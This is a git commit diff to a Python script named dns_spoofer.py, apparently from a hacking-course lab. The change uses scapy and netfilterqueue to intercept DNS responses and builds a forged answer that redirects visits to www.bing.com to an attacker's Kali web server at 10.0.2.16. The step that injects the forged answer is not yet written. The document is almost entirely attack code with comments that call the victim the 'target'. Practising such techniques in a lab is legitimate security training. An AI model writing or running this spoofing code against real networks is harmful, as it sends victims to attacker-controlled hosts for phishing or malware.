35c2d7c5ecc068965aa0331c5434c45118a1777e
Brenyn <brenynk@gmail.com>
2020-05-26 02:49:58 -0400

    find and alter dns records using scapy if target is visiting specific website

--- dns_spoofer.py
+++ dns_spoofer.py
@@ -17,9 +17,13 @@ import scapy.all as scapy
 
 def process_packet(packet):
 	scapy_packet = scapy.IP(packet.get_payload()) #convert netfilterqueue packet into scapy packet so we can use scapy filters
-	print(scapy_packet.show())
+	if scapy_packet.haslayer(scapy.DNSRR): #if the scapy packet has a dns response record
+		qname = scapy_packet[scapy.DNSQR].qname #website name is stored in qname variable within DNS Question Record layer
+		if "www.bing.com" in qname: # if the target is visiting the specified website
+			print("[+] Spoofing target")
+			answer = scapy.DNSRR(rrname = qname, rdata = "10.0.2.16") #create a packet that spoofs bing's ip to redirect target where we want ie our kali webserver
 	packet.accept()
 
-queue = netfilterqueue.NetfilterQueue()
-queue.bind(0, process_packet)
+queue = netfilterqueue.NetfilterQueue() #redirect traffic through netfilterqueue
+queue.bind(0, process_packet) #direct packets to process_packet where they are turned into scapy packets, analysed and acted upon
 queue.run()
